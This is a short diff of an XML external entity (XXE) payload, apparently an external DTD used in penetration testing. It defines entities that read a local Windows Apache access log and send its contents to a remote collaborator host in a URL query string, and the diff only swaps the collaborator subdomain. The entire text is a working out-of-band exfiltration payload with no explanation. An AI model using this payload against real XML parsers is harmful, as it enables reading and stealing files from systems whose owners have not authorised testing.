@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///C:Program Files/Apache Group/Apache/logs/access.log">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://i1kb6aop6c4k29pzpwt269bqthzcn1.pentestcollaborator.com/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://oskracljl0et94bdnwnctsil3c92xr.pentestcollaborator.com/?x=%file;'>">
 %eval;
 %exfiltrate;
